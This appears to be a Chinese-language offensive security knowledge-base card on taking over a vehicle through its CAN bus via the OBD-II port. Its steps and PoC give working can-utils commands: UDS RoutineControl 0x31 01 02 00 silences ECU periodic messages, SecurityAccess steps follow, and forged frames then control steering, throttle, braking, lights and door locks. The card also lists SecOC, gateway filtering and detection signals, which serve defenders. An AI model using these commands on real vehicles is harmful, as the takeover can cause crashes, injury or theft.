---
id: iot-protocol-uds-routinecontrol-can-injection-takeover
title: UDS RoutineControl 0x31 停发 ECU 周期报文 + CAN 注入接管车辆
type: scenario
domain: iot
path: iot/protocol
technique: uds-routinecontrol-can-injection-takeover
aliases:
- UDS
- ISO 14229
- RoutineControl
- 49
- 512
- CAN 注入
- OBD-II
- 车辆接管
tags:
- iot
- automotive
- can-bus
- uds
- isotp
- obd-ii
- injection
- takeover
cve: []
severity: high
confidence: high
status: verified
created: '2026-11-06'
updated: '2026-11-06'
verification:
  verified_by: verifier-V125
  verified_at: '2026-11-06T04:32:10+08:00'
  notes: 已对照原文与 7 张截图核对：OBD-II Pin6/14、CAN 无认证无加密、ISO-TP 单帧/FF/FC/CF、0x31 01 02 00(RID 0x0200) 停发周期报文、0x10/0x27 前置、cansend 控制转向/油门/制动/灯光/车门均一致；截图 10 显示注入被合法周期帧覆盖、截图 12 显示 7E9/7EA 正响应、截图 14 显示五项控制均生效；车型/ECU 无版本标记，affected_versions 保持 null；未实际运行。
---

## 一句话结论

OBD-II 端口直连 CAN 总线；攻击者用 UDS RoutineControl `31 01 02 00`（Routine ID 0x0200）让目标 ECU 停止周期报文，再用 `cansend` 注入伪造 CAN 帧，即可控制转向、油门、制动、灯光和车门；CAN 本身无认证/无加密，部分 ECU 的 0x27 SecurityAccess 是唯一门槛。

## 原理

- **CAN 总线**：广播式，所有节点共享总线；报文 = CAN ID（11/29 位）+ 0-8 字节数据；CAN ID 越小优先级越高；标准 CAN 无身份认证、无加密，任何接入总线的设备都能发送任意 ID 的帧。
- **UDS/ISO 14229**：诊断服务包括 0x10 会话切换、0x11 ECUReset、0x22 读数据、0x27 SecurityAccess、0x2E 写数据、0x31 RoutineControl、0x34/0x36/0x37 固件下载等；这些“合法”服务暴露在不可信环境就成为攻击面。
- **ISO-TP**：UDS 长报文通过 ISO 15765-2 拆帧；单帧以 0 开头（PCI 长度），多帧第一帧以 1 开头（总长度），流控帧以 3 开头，连续帧以 2 开头。CAN 一次 8 字节，长消息需要 FF/FC/CF。
- **0x31 RoutineControl**：`31 01 02 00` = service 0x31、subFunction 0x01（startRoutine）、Routine Identifier 0x0200（RequestMessageTransmission）。标准里 0x01 是“启动例程”，但很多 ECU 对 0x0200 的实现效果是“停止周期消息发送”；这是实现与规范的差异，也是漏洞根源。
- **消息碰撞**：合法 ECU 仍在周期发送（如 10ms），攻击者注入的帧只能存活约一个周期就被覆盖；所以必须先停发合法 ECU 的周期报文，再注入。
- **0x27 SecurityAccess**：部分 ECU 要求先 `27 01` 请求 Seed，再 `27 02 + Key` 通过认证；Key 算法需逆向（XOR/AES/CRC/自定义），可通过黑盒收集 Seed/Key、差分分析、算法识别。过了 27 后大部分敏感操作可执行。
- **结果**：停发后注入 `0CF00200`（转向）、`18FEE500`（油门）、`18FEF100`（制动）、`430`（灯光）、`421`（车门）即可控制车辆。

## 触发条件

- 能物理接入 OBD-II（Pin 6 CAN-H / Pin 14 CAN-L）或其它 CAN 总线暴露点。
- CAN 适配器 + SocketCAN/can-utils（`ip link`、`candump`、`cansend`、`isotpsend`）。
- 目标 ECU 支持 UDS 0x31 0x0200，且该操作不需要 0x27，或 0x27 Seed/Key 已绕过。
- CAN 波特率匹配（常见 500kbps），网关未过滤诊断/控制帧。

## 利用步骤

1. 接入 OBD-II，启用 CAN 接口：`sudo ip link set can0 up type can bitrate 500000`。
2. `candump can0` 抓流量，按 CAN ID/周期/数据映射功能（转速、车速、转向、制动、油门、车门、灯光、诊断 0x7E0/0x7E8）。
3. 先尝试直接 `cansend` 注入（如转向 `0CF00200#005A...`），观察是否被合法周期帧覆盖（通常 ~10ms 内被覆盖）。
4. 用 `isotpsend` 发 UDS 0x31：`echo "02 31 01 02 00" | isotpsend -s 7e1 -d 7e9 -l can0`；对其它 ECU 换源/目标地址（如 7e2/7ea）。
5. 若 ECU 要求扩展会话，先 `02 10 03`；若要求安全认证，先 `02 27 01` 取 Seed，逆向 Key 后 `02 27 02 <key>`。
6. 确认目标 ECU 周期报文停止（`candump` 中对应 ID 消失），再 `cansend` 注入转向/油门/制动/灯光/车门帧。
7. 观察车辆状态变化；测试结束恢复 ECU/重启，避免遗留异常状态。

## PoC

```bash
# 启用 CAN
sudo ip link set can0 up type can bitrate 500000

# 侦察
candump can0
candump can0 -n 1000 | awk '{print $3}' | sort | uniq -c | sort -rn
candump can0,0CF00400:1FF

# 直接注入（会被合法周期帧覆盖）
cansend can0 0CF00200#005A000000000000

# 停止 ECU B/C 周期报文（UDS RoutineControl 0x31, RID 0x0200）
echo "02 31 01 02 00" | isotpsend -s 7e1 -d 7e9 -l can0
echo "02 31 01 02 00" | isotpsend -s 7e2 -d 7ea -l can0

# 如需扩展会话 / 安全认证
echo "02 10 03" | isotpsend -s 7e1 -d 7e9 -l can0
echo "02 27 01" | isotpsend -s 7e1 -d 7e9 -l can0
echo "02 27 02 XX XX XX XX" | isotpsend -s 7e1 -d 7e9 -l can0

# 注入控制帧
cansend can0 0CF00200#0001000000000000   # 转向
cansend can0 18FEE500#0064000000000000   # 油门
cansend can0 18FEF100#00FF000000000000   # 制动
cansend can0 430#0800000000000000        # 远光灯
cansend can0 421#0100000000000000        # 解锁车门
```

## 变体与关联

- **UDS 服务变体**：0x10 会话切换、0x11 ECUReset（DoS）、0x22 读数据、0x2E 写配置、0x34/0x36/0x37 刷写；0x31 的 Routine ID 因车厂而异。
- **SecurityAccess 变体**：Seed/Key 算法（XOR/AES/CRC/自定义）、种子长度、错误计数/延时；可黑盒收集+差分分析。
- **总线变体**：CAN FD、LIN、FlexRay、车载以太网；网关/域控制器可能过滤跨域诊断帧。
- **关联卡片**：[[iot-protocol-someip-sd-stopoffer-spoof-tp-command]]（无认证控制协议）、[[iot-protocol-rtps-dds-writer-spoofing]]（身份伪造/注入）、[[iot-protocol-hartip-command9-quadrant-covert-channel]]（工控协议字段）。
- **边界**：若 ECU 强制 0x27 且 Key 算法不可逆/有次数限制、网关过滤 0x7E0/0x7E8 或控制帧、或使用 SecOC，链会失败；实际车辆测试需授权并在安全环境进行。

## 检测与防御

- **协议层**：SecOC（AES-128 CMAC + Freshness Value）认证 CAN 报文；UDS 诊断服务访问控制、敏感服务限制、会话管理；网关白名单/过滤。
- **物理层**：OBD-II 端口加锁/安全开关/访问日志；限制诊断接口暴露。
- **检测信号**：UDS 0x31 0x0200 被非诊断设备发送；目标 ECU 周期报文突然消失；同一 CAN ID 出现非周期/伪造数据；0x27 失败/暴力尝试。
- **测试建议**：先抓包映射 ID，再停发合法报文；注入前确认目标 ECU 已静默；测试后恢复/重启 ECU。
